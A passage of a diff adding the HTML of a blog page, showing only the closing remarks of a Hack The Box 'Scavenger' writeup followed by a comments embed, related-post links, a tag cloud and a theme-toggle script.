+<p>This way I got the root of scavenger box and learned alot from this box. So I would like to thank creator of this box <code class="highlighter-rouge">ompamo</code> for such an awesome box. Especially enumeration, enumeration and enumeration was awesome.</p>
+
+<p>I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.<br />
+Feedback are really appreciated !!<br />
+Tweet about this writeup if you like.</p>
+
+<p>You can see more blog at my medium here: <a href="https://medium.com/@gr4n173">gr4n173</a>.</p>
+
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'gr4n173'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2020/03/28/htb-sniper.html">
+          Hack The Box : Sniper
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/03/22/oauth-2.html">
+          OAuth 2
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/03/07/ctf-nephack3.html">
+          CTF: Nephack 3.0
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/.chm/" class="set-1">.chm</a> <a href="/tag/invoke/" class="set-1">Invoke</a> <a href="/tag/powershell/" class="set-1">Powershell</a> <a href="/tag/re/" class="set-1">RE</a> <a href="/tag/smb/" class="set-1">SMB</a> <a href="/tag/binaryexploitation/" class="set-1">binaryexploitation</a> <a href="/tag/ctf/" class="set-1">ctf</a> <a href="/tag/ffuf/" class="set-1">ffuf</a> <a href="/tag/ftp/" class="set-3">ftp</a> <a href="/tag/fuzz/" class="set-1">fuzz</a> <a href="/tag/gdb/" class="set-1">gdb</a> <a href="/tag/htb/" class="set-5">htb</a> <a href="/tag/introduction/" class="set-1">introduction</a> <a href="/tag/ipv6/" class="set-1">ipv6</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/lkm/" class="set-1">lkm</a> <a href="/tag/nc.exe/" class="set-1">nc.exe</a> <a href="/tag/nephack3/" class="set-1">nephack3</a> <a href="/tag/nishang/" class="set-1">nishang</a> <a href="/tag/oauth2/" class="set-1">oauth2</a> <a href="/tag/pcap/" class="set-1">pcap</a> <a href="/tag/postgres/" class="set-1">postgres</a> <a href="/tag/pwnables/" class="set-1">pwnables</a> <a href="/tag/rce/" class="set-1">rce</a> <a href="/tag/rsync/" class="set-1">rsync</a> <a href="/tag/server/" class="set-1">server</a> <a href="/tag/sqli/" class="set-3">sqli</a> <a href="/tag/webshell/" class="set-1">webshell</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/whois/" class="set-1">whois</a> <a href="/tag/windows/" class="set-1">windows</a></div>
+  
+
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+	  <center><script src="https://www.hackthebox.eu/badge/60443"></script> </center><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === 'undefined') {
+   theme = "dark";
+}
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+} else {
+    document.documentElement.setAttribute('data-theme', 'light');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
